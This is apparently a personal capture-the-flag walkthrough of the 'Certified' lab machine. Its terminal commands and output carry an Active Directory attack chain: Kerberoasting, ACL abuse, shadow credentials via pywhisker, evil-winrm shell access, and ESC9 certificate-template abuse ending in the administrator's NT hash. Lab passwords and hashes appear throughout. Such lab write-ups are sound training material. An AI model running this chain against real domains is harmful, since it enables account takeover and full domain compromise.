@@ -1,0 +1,334 @@
+As is common in Windows pentests, you will start the Certified box with credentials for the following account: 
+
+Username: judith.mader Password: judith09
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41 -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
+---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
+certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 11:30:51.476756  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$d4a7f337e3817cc4d7d409062c642082$7304ece5dc846f84d7f1d3d2653c0664fe63713540b4e8ba6d3c53675177a75ccbada79c1f9f98dfdf0dc2e0ec5a8e3313f178872a11c9c04cd7789bd2bb4967bafc6dbebe2745a2fbb101fb5ebeb0cd92a293ca0905ca72d7e005dae3388044f767867982e25b24c70ae76f9c0486c29da79bdab510a8936043e8a258b3c43d355efed4ef20408c018c72e7b966dc41b3b3207187b5196da1e5b87a359bc93c6e79f18ca05edfdbe6f56d3e7fa0ec6300a2fdbc0650e2d5369d28056a9f79ca056fce5e6d9f3e512423d9ea1181eabb0bcfb5b887555472cffb22dcab212dae96eec8423302f880bddd468d3025b89aca58ff91433596a0109b089b47a0cff65b8ca7a2fd917ac39ee5bb80dcfb6be486ab45d3e278cfa229880d35d9d60706613b8681bf7c3727712ab71c54c0ba3820dc029825ede5e574b4f08e56bff86a863015e299d37855e36f1c2339c6800887262fd14f838bf86ef90278616c56f065de1884a3d0437d17a9a38553311174fd3696780e4aec42cb8621c84bfc55a30af9d72d4cc70809762a2145b67bf8269b22d9dab7949ad2e0e1abfd2d88910ab5f95b86faed63af26536fc04b7f3427d25e94f0b862ba14fc44f4fa88f0c62b41119fdc4231e9e55d9d13b721d267cabd89ef9617cd034bc31861df920dc49592aa268bcb9c0b05df77c7687f1a63a390cf33ae6f90e284f362b786ce6debb7a16a2f7b84ff12786f32a3a9f8466648c0273bca9063574907f3babae5f709918b09127b95299816cfa9c35630975a47d91b534e50eb620e29afb550e6121a7bbff2b7a7f6a13eb624b92ff1e4ce6749c51104efdc481fcbf0219e586e80fbad1cf8c7e26923d1e01d98e25624aaef0dda85f7cb029e14eb64c0fc809d7e65108580826b7bb539231cf03fff843fdabd122a5974a3238466cfbdd0b513bf57aa19830324a07470b905586c43265119e58e2b584f60447ebfffe7707e7365bdd3a80dcd2f324718b60d1f8f5f3f3b11a8a7bd90fdfaaee2e7a349f8f3cdb4eeba2e2a245a15910d9566eabbce9e5a1d0fa317993607301deb155ff7d38cc3a2fd6f161f0ff551aa1ebf060c679267300ecafb15f5c0ccdf65caf3979869bbd401870ab005945512d24e7d598a5b3fded2447fe7f8ecf6b2e765670a978618edbc32966d779fa8ee13e7a124e54c5f50371d7abca5faca677b6f897d1f4a521349d2caf6e4a72de8552651b4200871959863b1f92d6859c13010c656eb644c3fee75d106f47f394813a361fcc6efbda3efbfc95a2c3eb2a8bc389294ac1bfd4599ebf301cf1a86e0488ed052bd7c72e195bdd2bd9dfad222f2a5b3f6659f7d182cdce232d0eb1afb09c73f9cd3aeaacc4f94ec75ac1b2fe27fb3aef8c62035d12c4c0e0f7eefa562cdd6c9207b03def9e7d2be6eb2e60d1abe0494bd600ed291c0c17c45d8a6c6530b8f3579c06a7443d29f24542e12b4c06a63b805b75b58a527f1930456d75ec00aa2cbce6f7e32ce58dc0acc2633f29fa7418852b4f65ca8fecae8862a1508ff96293207a45ab53dcca4c74a7ae44b18dbec85
+                                     
+
+
+┌──(kali㉿kali)-[~]
+└─$ python3 /home/kali/Timeroast/timeroast.py 10.10.11.41
+1000:$sntp-ms$e4f33af97181f5f19fbe6cb7d329b852$1c0111e900000000000a0b694c4f434cec44a1b3cbb4ea57e1b8428bffbfcd0aec44b0bf6bb4d2dbec44b0bf6bb4f7c3
+
+┌──(kali㉿kali)-[~/hashcat-6.2.6]
+└─$ ./hashcat.bin -m 31300 /home/kali/timeroast_hash.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.2.6-1473-g6cbe5d0ff) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-penryn-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 1470/2941 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+* Device #1: Not enough allocatable device memory or free host memory for mapping.
+
+Started: Mon Aug 11 14:17:41 2025
+Stopped: Mon Aug 11 14:17:44 2025
+                                                                                                                   
+┌──(kali㉿kali)-[~/hashcat-6.2.6]
+└─$
+
+1. The judith.mader user has WriteOwner ACL over the management group.
+
+
+2. The management group has GenericWrite ACL over the management_svc user.
+
+
+3. The management_svc has CanPSRenote attribute set, which means that the user can log in to
+the target (via WinRM )
+
+
+
+──(kali㉿kali)-[~]
+└─$ bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader                                                               
+[!] S-1-5-21-729746778-2675978091-3820388244-1103 is already the owner, no modification will be made
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+[*] DACL backed up to dacledit-20250811-100720.bak
+[*] DACL modified successfully!
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb"
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
+[*] Searching for the target account
+[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 8d47e519-fa7d-7b9c-234c-8fff69fb6fba
+[*] Updating the msDS-KeyCredentialLink attribute of management_svc
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: QtQPgr6T.pfx
+[*] Must be used with password: H0yOFsOzhkOp2hGUITJG
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad auth -pfx QtQPgr6T.pfx -password H0yOFsOzhkOp2hGUITJG -username management_svc -domain certified.htb -dc-ip 10.10.11.41
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'management_svc@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'management_svc.ccache'
+[*] Wrote credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=management_svc.ccache
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\management_svc\Documents> 
+
+got user.txt
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ pywhisker -d "certified.htb" -u "management_svc" -H 'a091c1832bcdd4677c28b5a6a1295584' --target "ca_operator" --action "add"
+[*] Searching for the target account
+[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: bd466aa3-f624-ca54-48ca-c4cb325b1cbb
+[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: uHC5lCkL.pfx
+[*] Must be used with password: dhdCF5kv1ptKqd7aJ3Fq
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad auth -pfx uHC5lCkL.pfx -password dhdCF5kv1ptKqd7aJ3Fq -username ca_operator -domain certified.htb -dc-ip 10.10.11.41
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'ca_operator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_operator.ccache'
+[*] Wrote credential cache to 'ca_operator.ccache'
+[*] Trying to retrieve NT hash for 'ca_operator'
+[*] Got hash for 'ca_operator@certified.htb': aad3b435b51404eeaad3b435b51404ee:b4b86f45c6018f1b664f70805f45d8f2
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ export KRB5CCNAME=ca_operator.ccache                                             
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad find -u ca_operator@certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -vulnerable
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
+[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to '20250811173322_Certipy.txt'
+[*] Wrote text output to '20250811173322_Certipy.txt'
+[*] Saving JSON output to '20250811173322_Certipy.json'
+[*] Wrote JSON output to '20250811173322_Certipy.json'
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ cat 20250811173322_Certipy.txt 
+Certificate Authorities
+  0
+    CA Name                             : certified-DC01-CA
+    DNS Name                            : DC01.certified.htb
+    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
+    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
+    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
+    Certificate Validity End            : 2124-05-13 15:43:41+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : CERTIFIED.HTB\Administrators
+      Access Rights
+        ManageCa                        : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        ManageCertificates              : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Enroll                          : CERTIFIED.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CertifiedAuthentication
+    Display Name                        : Certified Authentication
+    Certificate Authorities             : certified-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+                                          NoSecurityExtension
+    Extended Key Usage                  : Server Authentication
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-05-13T15:48:52+00:00
+    Template Last Modified              : 2024-05-13T15:55:20+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\operator ca
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFIED.HTB\Administrator
+        Full Control Principals         : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
+    [!] Vulnerabilities
+      ESC9                              : Template has no security extension.
+    [*] Remarks
+      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : Administrator
+[*] Successfully updated 'ca_operator'
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication       
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 4
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                                                                   
+Change back
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb                      
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : ca_operator@certified.htb
+[*] Successfully updated 'ca_operator'
+                                          
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad auth -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.10.11.41
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*] Using principal: 'administrator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ 
+
